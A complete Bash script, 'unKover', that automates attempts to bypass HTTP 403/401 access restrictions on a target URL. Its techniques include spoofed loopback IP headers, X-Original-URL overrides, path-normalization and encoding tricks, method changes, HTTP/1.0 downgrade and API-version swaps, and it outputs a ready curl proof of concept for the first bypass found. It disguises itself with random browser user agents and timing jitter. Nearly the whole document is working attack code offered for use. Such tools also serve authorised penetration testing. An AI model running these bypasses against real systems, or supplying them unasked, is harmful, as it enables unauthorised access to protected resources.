#!/bin/bash

# unKover - 403 Access Bypass Tester by Brute Logic
# Dependencies: curl
# Usage: bash unkover <URL> [-j|--json] [-q|--quiet] [-p|--parallel N] [--prefix /v2] [-H 'Header: value'] [-h|--help]
# Live 403 bypass detection with optional JSON output, custom headers (auth/cookies),
# a progress indicator, and optional per-technique parallelism (-p, off/sequential by default)

# ---------------------------------------------------------------------------
# CONFIG
# ---------------------------------------------------------------------------

TOOL="unKover v1.3 by Brute Logic - https://brutelogic.net"
JSON_MODE=false
QUIET_MODE=false
CONNECT_TIMEOUT=3
MAX_TIME=5

URL=""
PREFIX=""
CUSTOM_HEADERS=()
PARALLEL=1
JOB_PIDS=()

while [[ $# -gt 0 ]]; do
    case "$1" in
        -j|--json) JSON_MODE=true; shift ;;
        -q|--quiet) QUIET_MODE=true; shift ;;
        -h|--help) HELP_REQUESTED=1; shift ;;
        --prefix)
            if [[ $# -ge 2 ]]; then PREFIX="$2"; shift 2; else shift; fi
            ;;
        -H|--header)
            if [[ $# -ge 2 ]]; then CUSTOM_HEADERS+=("$2"); shift 2; else shift; fi
            ;;
        -p|--parallel)
            if [[ $# -ge 2 ]]; then
                [[ "$2" =~ ^[0-9]+$ ]] && PARALLEL="$2"
                shift 2
            else
                shift
            fi
            ;;
        *) URL="$1"; shift ;;
    esac
done

# Off (1) is the default/sequential, unchanged-behavior mode. User-controlled
# only: a target never gets hit harder/faster than what -p explicitly asks for.
(( PARALLEL < 1 )) && PARALLEL=1
(( PARALLEL > 50 )) && PARALLEL=50

# Pre-build curl -H args for custom headers (auth/cookies/JWT etc.) once,
# so every request (through req() and the HTTP/1.0 probe) carries them.
CUSTOM_HEADER_ARGS=()
for __h in "${CUSTOM_HEADERS[@]}"; do
    CUSTOM_HEADER_ARGS+=(-H "$__h")
done
unset __h

# ---------------------------------------------------------------------------
# PAYLOAD ARRAYS
# ---------------------------------------------------------------------------

USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
)

# Realistic browser headers sent with every request
BROWSER_HEADERS=(
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    -H "Accept-Language: en-US,en;q=0.5"
    -H "Accept-Encoding: gzip, deflate, br"
    -H "Connection: keep-alive"
)

IP_HEADERS=(
    "X-Forwarded-For"
    "X-Real-IP"
    "X-Original-Forwarded-For"
    "X-Client-IP"
    "True-Client-IP"
    "CF-Connecting-IP"
)

# Shared loopback / internal notations, ordered for fast exit
IP_VALUES=(
    "127.0.0.1"
    "0.0.0.0"
    "127.1.1.1"
    "::1"
    "192.168.1.1"
)

# Ordered by PoC relevance — POST/PUT before OPTIONS/HEAD
METHODS=(
    "POST"
    "PUT"
    "PATCH"
    "HEAD"
    "OPTIONS"
    "BRUTE"
)

METHODS_LOWER=(
    "get"
    "post"
    "put"
    "head"
    "options"
)

REFERER_VALUES=(
    "admin"
    "dashboard"
    "internal"
)

PROTO_VALUES=(
    "https"
    "http"
)

HOP_BY_HOP_HEADERS=(
    "Authorization"
    "Cookie"
    "X-Api-Key"
    "X-Auth-Token"
    "X-Access-Token"
)

SUFFIXES=(
    "/"
    ";x"
    "%20"
    "%3B.json"
    "%23.json"
    "%3F.json"
    "%00.json"
)

# Ordered low-noise → high-noise
PATH_VARIANTS=(
    "/."
    "/./"
    "//"
    "/%2f"
    "/%20"
    "/%09"
    "/..;/"
)

# Ordered low-noise → high-noise
OVERRIDE_HEADERS=(
    "X-Rewrite-URL"
    "X-Original-URL"
)

# ---------------------------------------------------------------------------
# OUTPUT & DISPLAY
# ---------------------------------------------------------------------------

# Color codes — auto-disabled when neither stdout nor stderr is a terminal
# (piped to a file/jq) or when NO_COLOR is set, so logs stay clean.
if [[ -z "${NO_COLOR:-}" ]] && { [[ -t 1 ]] || [[ -t 2 ]]; }; then
    RED='\033[1;31m'
    GREEN='\033[1;32m'
    YELLOW='\033[1;33m'
    CYAN='\033[1;36m'
    BOLD='\033[1m'
    DIM='\033[2m'
    NC='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; CYAN=''; BOLD=''; DIM=''; NC=''
fi

# Progress indicator state (so the tool never looks stuck mid-technique)
TOTAL_TESTS=12
TEST_INDEX=0
CURRENT_TEST=""
SPIN_CHARS=('|' '/' '-' '\')
# req() runs inside $(...) command substitution (a subshell), so a plain shell
# variable incremented there would be discarded on return — use a temp file
# instead so the request count stays accurate across every call.
REQ_COUNT_FILE=$(mktemp 2>/dev/null || echo "/tmp/.unkover_reqcount.$$")
echo 0 > "$REQ_COUNT_FILE" 2>/dev/null

# Parallel-mode coordination (-p/--parallel). Background workers run in their
# own subshells, so they can't update this shell's DONE/FINDINGS variables —
# they signal a found bypass through these files instead: DONE_FLAG tells
# every worker to stop firing new requests, FINDING_FILE holds the one
# winning finding, and LOCK_DIR (mkdir is atomic) makes sure only the first
# worker to find a bypass gets to write it.
JOBS_DIR=$(mktemp -d 2>/dev/null)
[[ -z "$JOBS_DIR" ]] && JOBS_DIR="/tmp/.unkover_jobs.$$" && mkdir -p "$JOBS_DIR" 2>/dev/null
DONE_FLAG="$JOBS_DIR/done.flag"
FINDING_FILE="$JOBS_DIR/finding.txt"
LOCK_DIR="$JOBS_DIR/lock"

trap '[[ -n "$REQ_COUNT_FILE" ]] && rm -f "$REQ_COUNT_FILE"; [[ -n "$JOBS_DIR" ]] && rm -rf "$JOBS_DIR"' EXIT

# Print header
header() {
    echo ""
    printf "%b%s%b\n" "${BOLD}${CYAN}" "$TOOL" "$NC"
    echo ""
}

usage() {
    header
    printf "%bUsage:%b bash unkover <URL> [--prefix /v2] [-j|--json] [-q|--quiet] [-p|--parallel N] [-H 'Header: value'] [-h|--help]\n" "$BOLD" "$NC"
    echo ""
    printf "%bArguments:%b\n" "$BOLD" "$NC"
    echo "  URL                   Target URL returning 403 (required)"
    echo "  --prefix PATH         Additional path prefix for API version bypass (optional)"
    echo "  -j, --json            Output results in JSON format"
    echo "  -q, --quiet           Suppress progress output"
    echo "  -p, --parallel N      Fire N requests concurrently per technique (default: 1 = sequential)."
    echo "                        Off unless you ask for it. Higher is faster but noisier/more"
    echo "                        detectable — you control the trade-off, e.g. -p 4, -p 6, -p 10."
    echo "  -H, --header 'H: V'   Add a custom header to every request (repeatable)."
    echo "                        Use it to carry auth, e.g. a session cookie, JWT,"
    echo "                        or API key, through the bypass attempts."
    echo "  -h, --help            Show this help message and exit"
    echo ""
    printf "%bExamples:%b\n" "$BOLD" "$NC"
    echo "  bash unkover https://target.com/admin"
    echo "  bash unkover https://target.com/admin --prefix /v2"
    echo "  bash unkover https://target.com/admin -j | jq"
    echo "  bash unkover https://target.com/admin -H 'Cookie: session=abc123'"
    echo "  bash unkover https://target.com/admin -H 'Authorization: Bearer eyJhbGciOi...'"
    echo "  bash unkover https://target.com/admin -p 6"
    echo "  bash unkover https://target.com/admin -p 6 -H 'Cookie: session=abc' -H 'X-Api-Key: xyz'"
    echo ""
    exit 1
}

# Print result in human mode
print_result() {
    $JSON_MODE && return
    $QUIET_MODE || printf "\r\033[K" >&2
    printf "%bTarget:%b %s\n" "$BOLD" "$NC" "$URL"
    printf "%bBaseline:%b %s (%s bytes)\n" "$BOLD" "$NC" "$baseline_status" "$baseline_size"
    echo ""
    if [[ "$DONE" -eq 1 ]]; then
        printf "${GREEN}BYPASS FOUND${NC}\n"
        printf "%bTechnique:%b %s\n" "$BOLD" "$NC" "$(echo "$FINDINGS" | grep -oP '(?<="technique":")[^"]*')"
	printf "%bPoC: %s%b\n" "$YELLOW" "$FIRST_POC" "$NC"
        printf "%bResult:%b %s (%s bytes)\n" "$BOLD" "$NC" "$(echo "$FINDINGS" | grep -oP '(?<="status":)[0-9]+')" "$(echo "$FINDINGS" | grep -oP '(?<="size":)[0-9]+')"
    else
        printf "${RED}No bypass found.${NC}\n"
    fi
    echo ""
}

# JSON output
json_output() {
    local bypass="false"
    local poc="null"
    [[ -n "$FIRST_POC" ]] && bypass="true" && poc="\"$(json_str "$FIRST_POC")\""

    printf '{"meta":{"tool":"%s","timestamp":"%s","elapsed_time":%d},"bypass":%s,"target":"%s","poc":%s,"findings":%s,"baseline":{"status":%s,"size":%s}}\n' \
    	"$TOOL" \
    	"$(date '+%d-%b-%Y %H:%M:%S')" \
    	"$elapsed" \
    	"$bypass" \
    	"$(json_str "$URL")" \
    	"$poc" \
    	"$FINDINGS" \
    	"$baseline_status" \
    	"$baseline_size"
}

# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------

# Random UA
random_ua() {
    echo "${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
}

# Random jitter 100-500ms
jitter() {
    local ms=$(( (RANDOM % 400) + 100 ))
    sleep "0.${ms}"
}

# Live progress indicator — ticks on every request fired so the tool never
# appears to hang during a technique that sends many requests. Written to
# stderr so it never ends up inside a $(...) capture or pollutes -j/--json output.
show_progress() {
    $JSON_MODE && return
    $QUIET_MODE && return
    local n
    n=$(( $(cat "$REQ_COUNT_FILE" 2>/dev/null || echo 0) + 1 ))
    echo "$n" > "$REQ_COUNT_FILE" 2>/dev/null
    local spin="${SPIN_CHARS[$(( n % ${#SPIN_CHARS[@]} ))]}"
    printf "\r\033[K%b[%2d/%2d]%b Testing %-22s %b%s%b  %b(%d req sent)%b" \
        "$CYAN" "$TEST_INDEX" "$TOTAL_TESTS" "$NC" "${CURRENT_TEST}..." \
        "$YELLOW" "$spin" "$NC" "$DIM" "$n" "$NC" >&2
}

# Fire request, return "STATUS SIZE"
# --compressed needed for consistent size_download when Accept-Encoding: gzip is sent
req() {
    local url="$1"
    shift
    local ua; ua=$(random_ua)
    local out
    out=$(curl -sk --compressed -o /dev/null -w "%{http_code} %{size_download}" \
        --connect-timeout "$CONNECT_TIMEOUT" \
        --max-time "$MAX_TIME" \
        -A "$ua" \
        "${BROWSER_HEADERS[@]}" \
        "${CUSTOM_HEADER_ARGS[@]}" \
        "$@" "$url" 2>/dev/null) || out="000 0"
    jitter
    show_progress
    echo "$out"
}

# Extract status from "STATUS SIZE"
status_of() { echo "$1" | cut -d' ' -f1; }

# Extract size from "STATUS SIZE"
size_of() { echo "$1" | cut -d' ' -f2; }

# Check if status is a bypass (2xx or 3xx)
is_bypass() { [[ "$1" =~ ^[23] ]]; }

# Escape string for JSON
json_str() {
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    echo "$s"
}

# Extract base URL (scheme + host)
get_base() { echo "$1" | sed 's|\(https\?://[^/]*\).*|\1|'; }

# Extract path (everything after scheme + host)
get_path() { echo "$1" | sed 's|https\?://[^/]*||'; }

# True once a bypass has been found — in sequential mode via the DONE
# variable set by add_finding(); in parallel mode via DONE_FLAG, since
# background workers run in subshells and can't touch this shell's variables.
stopped() {
    if (( PARALLEL > 1 )); then
        [[ -e "$DONE_FLAG" ]]
    else
        [[ "$DONE" -eq 1 ]]
    fi
}

# Dispatch one candidate probe. Sequential mode (default, -p unset or 1)
# behaves exactly as before: fire the request, call add_finding() directly.
# Parallel mode (-p N > 1) throttles to N concurrent background workers and
# records a hit via the shared finding file/lock instead, since a worker
# can't set DONE/FINDINGS in the parent shell. Usage:
#   probe "<technique>" "<req_json>" "<poc>" "$url" [extra req()/curl args...]
probe() {
    local technique="$1" req_json="$2" poc="$3"
    shift 3

    if (( PARALLEL <= 1 )); then
        local res; res=$(req "$@")
        local s; s=$(status_of "$res")
        local z; z=$(size_of "$res")
        is_bypass "$s" && add_finding "$technique" "$req_json" "$s" "$z" "$poc"
        return
    fi

    while (( ${#JOB_PIDS[@]} >= PARALLEL )); do
        wait "${JOB_PIDS[0]}" 2>/dev/null
        JOB_PIDS=("${JOB_PIDS[@]:1}")
    done
    (
        [[ -e "$DONE_FLAG" ]] && exit 0
        local res; res=$(req "$@")
        local s; s=$(status_of "$res")
        local z; z=$(size_of "$res")
        if is_bypass "$s" && ! is_wildcard "$s" "$z"; then
            if mkdir "$LOCK_DIR" 2>/dev/null; then
                local finding
                finding=$(printf '{"technique":"%s","request":%s,"result":{"status":%s,"size":%s}}' \
                    "$technique" "$req_json" "$s" "$z")
                printf '%s\n%s\n' "$finding" "$poc" > "$FINDING_FILE"
                : > "$DONE_FLAG"
            fi
        fi
    ) &
    JOB_PIDS+=($!)
}

run_test() {
    local name="$1"
    local func="$2"
    shift 2
    stopped && return
    TEST_INDEX=$(( TEST_INDEX + 1 ))
    CURRENT_TEST="$name"
    if ! $JSON_MODE && ! $QUIET_MODE; then
        printf "\r\033[K%b[%2d/%2d]%b Testing %-22s" "$CYAN" "$TEST_INDEX" "$TOTAL_TESTS" "$NC" "${name}..." >&2
    fi
    "$func" "$@"
    # Drain this technique's background workers before moving on, so the
    # next technique only starts once we definitively know whether this one
    # found a bypass — preserving the priority/stop-at-first-hit ordering.
    if (( PARALLEL > 1 )); then
        local pid
        for pid in "${JOB_PIDS[@]}"; do wait "$pid" 2>/dev/null; done
        JOB_PIDS=()
    fi
}

# ---------------------------------------------------------------------------
# WILDCARD CALIBRATION
# ---------------------------------------------------------------------------

calibrate() {
    local url="$1"
    local rand="nonexistent_$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
    local base; base=$(get_base "$url")
    local path; path=$(get_path "$url")
    local probe="${base}${path%/*}/${rand}"
    local res; res=$(req "$probe")
    WILDCARD_STATUS=$(status_of "$res")
    WILDCARD_SIZE=$(size_of "$res")
}

# Check if result matches wildcard baseline (FP filter)
is_wildcard() {
    local status="$1"
    local size="$2"
    [[ "$status" == "$WILDCARD_STATUS" ]] || return 1
    local diff=$(( size - WILDCARD_SIZE ))
    [[ $diff -lt 0 ]] && diff=$(( -diff ))
    [[ $diff -le 50 ]]
}

# ---------------------------------------------------------------------------
# FINDING BUILDER
# ---------------------------------------------------------------------------

FINDINGS="[]"
FIRST_POC=""
WILDCARD_STATUS=""
WILDCARD_SIZE=0
DONE=0

add_finding() {
    local technique="$1"
    local request_json="$2"
    local status="$3"
    local size="$4"
    local poc="$5"

    # Skip if matches wildcard baseline
    is_wildcard "$status" "$size" && return

    local finding
    finding=$(printf '{"technique":"%s","request":%s,"result":{"status":%s,"size":%s}}' \
        "$technique" "$request_json" "$status" "$size")

    FINDINGS="[$finding]"
    FIRST_POC="$poc"
    DONE=1
}

# ---------------------------------------------------------------------------
# TECHNIQUES — ordered by reliability and specificity
# ---------------------------------------------------------------------------

test_ip_headers() {
    local url="$1"
    stopped && return
    for header in "${IP_HEADERS[@]}"; do
        stopped && return
        for ip in "${IP_VALUES[@]}"; do
            stopped && return
            local req_json
            req_json=$(printf '{"header":"%s","value":"%s"}' \
                "$(json_str "$header")" "$(json_str "$ip")")
            local poc="curl -i -H '${header}: ${ip}' '$(json_str "$url")'"
            probe "ip_header_spoof" "$req_json" "$poc" "$url" -H "${header}: ${ip}"
        done
    done
}

test_forwarded_header() {
    local url="$1"
    stopped && return
    for ip in "${IP_VALUES[@]}"; do
        stopped && return
        # RFC 7239: IPv6 literals must be bracketed and quoted; "For" beats case-sensitive filters
        local val; [[ "$ip" == *:* ]] && val="For=\"[${ip}]\"" || val="For=${ip}"
        local req_json
        req_json=$(printf '{"header":"Forwarded","value":"%s"}' "$(json_str "$val")")
        local poc="curl -i -H 'Forwarded: ${val}' '$(json_str "$url")'"
        probe "forwarded_header" "$req_json" "$poc" "$url" -H "Forwarded: ${val}"
    done
}

test_method_tampering() {
    local url="$1"
    stopped && return
    for method in "${METHODS[@]}"; do
        stopped && return
        local res; res=$(req "$url" -X "$method")
        local s; s=$(status_of "$res")
        local z; z=$(size_of "$res")
        [[ "$method" != "HEAD" && "$z" -eq 0 ]] && continue
        if is_bypass "$s"; then
            local req_json; req_json=$(printf '{"method":"%s"}' "$method")
            local poc="curl -i -X '${method}' '$(json_str "$url")'"
            add_finding "method_tampering" "$req_json" "$s" "$z" "$poc"
        fi
    done
}

test_method_case() {
    local url="$1"
    stopped && return
    for method in "${METHODS_LOWER[@]}"; do
        stopped && return
        local req_json; req_json=$(printf '{"method":"%s"}' "$method")
        local poc="curl -i -X '${method}' '$(json_str "$url")'"
        probe "method_case" "$req_json" "$poc" "$url" -X "$method"
    done
}

test_protocol_header() {
    local url="$1"
    stopped && return
    for proto in "${PROTO_VALUES[@]}"; do
        stopped && return
        local req_json; req_json=$(printf '{"header":"X-Forwarded-Proto","value":"%s"}' "$proto")
        local poc="curl -i -H 'X-Forwarded-Proto: ${proto}' '$(json_str "$url")'"
        probe "protocol_header" "$req_json" "$poc" "$url" -H "X-Forwarded-Proto: ${proto}"
    done
}

test_referer() {
    local url="$1"
    stopped && return
    local host; host=$(get_base "$url")
    for ref in "${REFERER_VALUES[@]}"; do
        stopped && return
        local referer="${host}/${ref}"
        local req_json; req_json=$(printf '{"header":"Referer","value":"%s"}' "$(json_str "$referer")")
        local poc="curl -i -H 'Referer: ${referer}' '$(json_str "$url")'"
        probe "referer_trust" "$req_json" "$poc" "$url" -H "Referer: ${referer}"
    done
}

test_header_override() {
    local url="$1"
    stopped && return
    local path; path=$(get_path "$url")
    local base; base=$(get_base "$url")
    for header in "${OVERRIDE_HEADERS[@]}"; do
        stopped && return
        local req_json
        req_json=$(printf '{"header":"%s","value":"%s"}' \
            "$(json_str "$header")" "$(json_str "$path")")
        local poc="curl -i -H '${header}: ${path}' '$(json_str "$url")'"
        probe "header_override" "$req_json" "$poc" "$url" -H "${header}: ${path}"
    done
}

test_url_encoding() {
    local url="$1"
    stopped && return
    local base; base=$(get_base "$url")
    local path; path=$(get_path "$url")

    # Encode first char of the last path segment
    local last_segment; last_segment=$(basename "$path")
    local encoded_segment
    encoded_segment=$(echo "$last_segment" | sed 's/^\(.\)/\1/' | \
        sed 's/^a/%61/;s/^b/%62/;s/^c/%63/;s/^d/%64/;s/^e/%65/;s/^f/%66/;
             s/^g/%67/;s/^h/%68/;s/^i/%69/;s/^j/%6a/;s/^k/%6b/;s/^l/%6c/;
             s/^m/%6d/;s/^n/%6e/;s/^o/%6f/;s/^p/%70/;s/^q/%71/;s/^r/%72/;
             s/^s/%73/;s/^t/%74/;s/^u/%75/;s/^v/%76/;s/^w/%77/;s/^x/%78/;
             s/^y/%79/;s/^z/%7a/;s/^A/%41/;s/^B/%42/;s/^C/%43/;s/^D/%44/;
             s/^E/%45/;s/^F/%46/;s/^G/%47/;s/^H/%48/;s/^I/%49/')
    local parent_path; parent_path=$(dirname "$path")
    local mutated="${base}${parent_path}/${encoded_segment}"
    local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
    local poc="curl -i --path-as-is '$(json_str "$mutated")'"
    probe "url_encoding" "$req_json" "$poc" "$mutated" --path-as-is

    stopped && return

    # Double encoding
    local double="${base}${path//\%/%25}"
    req_json=$(printf '{"path":"%s"}' "$(json_str "$double")")
    poc="curl -i --path-as-is '$(json_str "$double")'"
    probe "url_encoding" "$req_json" "$poc" "$double" --path-as-is
}

test_path_normalization() {
    local url="$1"
    stopped && return
    local base; base=$(get_base "$url")
    local path; path=$(get_path "$url")
    for variant in "${PATH_VARIANTS[@]}"; do
        stopped && return
        local mutated="${base}${variant}${path#/}"
        local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
        local poc="curl -i --path-as-is '$(json_str "$mutated")'"
        probe "path_normalization" "$req_json" "$poc" "$mutated" --path-as-is
    done
}

test_http10() {
    local url="$1"
    stopped && return
    local res; res=$(curl -sk --http1.0 -o /dev/null -w "%{http_code} %{size_download}" \
        --connect-timeout "$CONNECT_TIMEOUT" \
        --max-time "$MAX_TIME" \
        "${CUSTOM_HEADER_ARGS[@]}" \
        "$url" 2>/dev/null) || res="000 0"
    jitter
    show_progress
    local s; s=$(status_of "$res")
    local z; z=$(size_of "$res")
    if is_bypass "$s"; then
        local req_json; req_json=$(printf '{"protocol":"HTTP/1.0"}')
        local poc="curl -i --http1.0 '$(json_str "$url")'"
        add_finding "http10_bypass" "$req_json" "$s" "$z" "$poc"
    fi
}

test_hop_by_hop() {
    local url="$1"
    stopped && return
    for header in "${HOP_BY_HOP_HEADERS[@]}"; do
        stopped && return
        local req_json; req_json=$(printf '{"header":"%s"}' "$(json_str "$header")")
        local poc="curl -i -H '${header}: bypass' -H 'Connection: ${header}' '$(json_str "$url")'"
        probe "hop_by_hop" "$req_json" "$poc" "$url" -H "${header}: bypass" -H "Connection: ${header}"
    done
}

test_path_suffix() {
    local url="$1"
    stopped && return
    for suffix in "${SUFFIXES[@]}"; do
        stopped && return
        local mutated="${url}${suffix}"
        local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
        local poc="curl -i --path-as-is '$(json_str "$mutated")'"
        probe "path_suffix" "$req_json" "$poc" "$mutated" --path-as-is
    done
}

test_api_version() {
    local url="$1"
    local prefix="$2"
    stopped && return
    local base; base=$(get_base "$url")
    local path; path=$(get_path "$url")

    # Sub-technique 1: prefix injection
    local prefixes=("/v2" "/v3" "/api/v1" "/api/v2" "/api")
    [[ -n "$prefix" ]] && prefixes+=("$prefix")

    for p in "${prefixes[@]}"; do
        stopped && return
        local mutated="${base}${p}${path}"
        local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
        local poc="curl -i '$(json_str "$mutated")'"
        probe "api_version" "$req_json" "$poc" "$mutated"
    done

    # Sub-technique 2: version swap (replace /v1/ with alternatives)
    if [[ "$path" =~ /v[0-9]+/ ]]; then
        local swap_targets=("v2" "v3" "v4" "v1.1" "v2.0")
        for sv in "${swap_targets[@]}"; do
            stopped && return
            local swapped; swapped=$(echo "$path" | sed "s|/v[0-9][^/]*/|/${sv}/|")
            [[ "$swapped" == "$path" ]] && continue
            local mutated="${base}${swapped}"
            local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
            local poc="curl -i '$(json_str "$mutated")'"
            probe "api_version" "$req_json" "$poc" "$mutated"
        done
    fi
}

# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------

main() {
    [[ -z "$URL" ]] && usage
    START_TIME=$SECONDS
    $JSON_MODE || header
    if ! $JSON_MODE && ! $QUIET_MODE && (( PARALLEL > 1 )); then
        printf "%bRunning with %d parallel workers%b\n\n" "$CYAN" "$PARALLEL" "$NC"
    fi

    # Preflight — confirm target returns 401 or 403
    CURRENT_TEST="baseline check"
    local baseline; baseline=$(req "$URL")
    local baseline_status; baseline_status=$(status_of "$baseline")
    local baseline_size; baseline_size=$(size_of "$baseline")

    if [[ "$baseline_status" != "403" && "$baseline_status" != "401" ]]; then
        if $JSON_MODE; then
            printf '{"error":"target returned %s, expected 401 or 403"}\n' "$baseline_status"
        else
            printf 'Target returned %s, expected 401 or 403.\n' "$baseline_status"
        fi
        exit 1
    fi

    # Wildcard calibration — learn server default behavior
    CURRENT_TEST="calibration"
    calibrate "$URL"

    # Run techniques — most specific/reliable first, stop at first bypass
    run_test "ip_header_spoof"     test_ip_headers       "$URL"
    run_test "forwarded_header"    test_forwarded_header  "$URL"
    run_test "method_case"         test_method_case       "$URL"
    run_test "protocol_header"     test_protocol_header   "$URL"
    run_test "referer"             test_referer           "$URL"
    run_test "header_override"     test_header_override   "$URL"
    run_test "url_encoding"        test_url_encoding      "$URL"
    run_test "path_normalization"  test_path_normalization "$URL"
    run_test "http10"              test_http10            "$URL"
    run_test "hop_by_hop"          test_hop_by_hop        "$URL"
    run_test "path_suffix"         test_path_suffix       "$URL"
    run_test "api_version"         test_api_version       "$URL" "$PREFIX"

    # In parallel mode the winning finding (if any) was recorded by a
    # background worker into FINDING_FILE, since it couldn't set these
    # variables directly — pull it in now for print_result()/json_output().
    if (( PARALLEL > 1 )) && [[ -e "$DONE_FLAG" ]]; then
        DONE=1
        FINDINGS="[$(sed -n '1p' "$FINDING_FILE")]"
        FIRST_POC=$(sed -n '2p' "$FINDING_FILE")
    fi

    elapsed=$(( SECONDS - START_TIME ))

    if $JSON_MODE; then
    	json_output
    else
    	print_result
    fi
}

[[ "$HELP_REQUESTED" == "1" ]] && usage

main "$@"
